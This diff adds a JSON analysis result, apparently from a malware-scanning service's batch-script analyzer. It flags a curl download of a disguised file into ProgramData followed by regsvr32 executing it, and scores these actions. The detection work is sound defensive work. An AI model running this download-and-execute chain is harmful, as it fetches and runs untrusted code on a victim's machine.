@@ -1,0 +1,239 @@
+{
+  "extra": {
+    "drop_file": false,
+    "score": 800,
+    "sections": [
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "Command": "regsvr32 \"C:\\ProgramData\\Pterds\\HErtop.pos\"",
+            "LOLBAS": "regsvr32"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "LOLBAS",
+            "Command"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 2,
+          "score": 50,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Possible rare LOLBAS found",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "Command": "curl.exe -o C:\\ProgramData\\Pterds\\HErtop.pos 1.1.1.1/4.dat",
+            "Destination": "C:\\ProgramData\\Pterds\\HErtop.pos",
+            "URL": "1.1.1.1/4.dat"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "URL",
+            "Destination",
+            "Command"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 5,
+          "score": 0,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {
+          "dynamic": {
+            "process": {
+              "command_line": [
+                "curl.exe -o C:\\ProgramData\\Pterds\\HErtop.pos 1.1.1.1/4.dat"
+              ]
+            }
+          },
+          "network": {
+            "static": {
+              "ip": [
+                "1.1.1.1"
+              ],
+              "uri": [
+                "http://1.1.1.1/4.dat"
+              ],
+              "uri_path": [
+                "/4.dat"
+              ]
+            }
+          }
+        },
+        "title_text": "External file download in batch script",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": true,
+        "body": null,
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 5,
+          "score": 750,
+          "score_map": {
+            "downloaded_file_to_different_extension": 250,
+            "downloaded_file_to_different_name": 250,
+            "downloads_file_to_programdata": 250
+          },
+          "signatures": {
+            "downloaded_file_to_different_extension": 1,
+            "downloaded_file_to_different_name": 1,
+            "downloads_file_to_programdata": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {
+          "file": {
+            "path": [
+              "C:\\ProgramData\\Pterds\\HErtop.pos"
+            ]
+          },
+          "network": {
+            "static": {
+              "ip": [
+                "1.1.1.1"
+              ],
+              "uri": [
+                "http://1.1.1.1/4.dat"
+              ],
+              "uri_path": [
+                "/4.dat"
+              ]
+            }
+          }
+        },
+        "title_text": "http://1.1.1.1/4.dat",
+        "zeroize_on_tag_safe": false
+      }
+    ]
+  },
+  "files": {
+    "extracted": [
+      {
+        "name": "055d0df054_deobfuscated.bat",
+        "sha256": "055d0df0541f05f7bd42eb0d4ebd4d8774718076085021912191e6b6660abd9d"
+      }
+    ],
+    "supplementary": []
+  },
+  "results": {
+    "heuristics": [
+      {
+        "attack_ids": [],
+        "heur_id": 2,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 5,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 5,
+        "signatures": [
+          "downloads_file_to_programdata",
+          "downloaded_file_to_different_name",
+          "downloaded_file_to_different_extension"
+        ]
+      }
+    ],
+    "tags": {
+      "dynamic.process.command_line": [
+        {
+          "heur_id": 5,
+          "signatures": [],
+          "value": "curl.exe -o C:\\ProgramData\\Pterds\\HErtop.pos 1.1.1.1/4.dat"
+        }
+      ],
+      "file.path": [
+        {
+          "heur_id": 5,
+          "signatures": [
+            "downloads_file_to_programdata",
+            "downloaded_file_to_different_name",
+            "downloaded_file_to_different_extension"
+          ],
+          "value": "C:\\ProgramData\\Pterds\\HErtop.pos"
+        }
+      ],
+      "network.static.ip": [
+        {
+          "heur_id": 5,
+          "signatures": [],
+          "value": "1.1.1.1"
+        },
+        {
+          "heur_id": 5,
+          "signatures": [
+            "downloads_file_to_programdata",
+            "downloaded_file_to_different_name",
+            "downloaded_file_to_different_extension"
+          ],
+          "value": "1.1.1.1"
+        }
+      ],
+      "network.static.uri": [
+        {
+          "heur_id": 5,
+          "signatures": [],
+          "value": "http://1.1.1.1/4.dat"
+        },
+        {
+          "heur_id": 5,
+          "signatures": [
+            "downloads_file_to_programdata",
+            "downloaded_file_to_different_name",
+            "downloaded_file_to_different_extension"
+          ],
+          "value": "http://1.1.1.1/4.dat"
+        }
+      ],
+      "network.static.uri_path": [
+        {
+          "heur_id": 5,
+          "signatures": [],
+          "value": "/4.dat"
+        },
+        {
+          "heur_id": 5,
+          "signatures": [
+            "downloads_file_to_programdata",
+            "downloaded_file_to_different_name",
+            "downloaded_file_to_different_extension"
+          ],
+          "value": "/4.dat"
+        }
+      ]
+    },
+    "temp_submission_data": {}
+  }
+}
